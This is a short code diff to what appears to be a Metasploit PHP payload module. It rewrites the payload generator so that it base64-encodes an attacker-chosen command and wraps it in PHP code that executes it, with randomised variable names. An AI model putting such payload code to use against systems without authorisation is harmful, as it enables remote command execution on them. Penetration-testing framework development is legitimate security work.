@@ -35,11 +35,14 @@ module MetasploitModule
   # Constructs the payload
   #
   def generate(_opts = {})
-    buf = "#{php_preamble}"
-    buf += "$c = base64_decode('#{Rex::Text.encode_base64(command_string)}');"
-    buf += "#{php_system_block({:cmd_varname=>"$c"})}"
-    return super + buf
-
+    vars = Rex::RandomIdentifier::Generator.new
+    dis = "$#{vars[:dis]}"
+    shell = <<-END_OF_PHP_CODE
+              #{php_preamble(disabled_varname: dis)}
+              $c = base64_decode("#{Rex::Text.encode_base64(command_string)}");
+              #{php_system_block(cmd_varname: '$c', disabled_varname: dis)}
+    END_OF_PHP_CODE
+    return super + shell
   end
 
   #
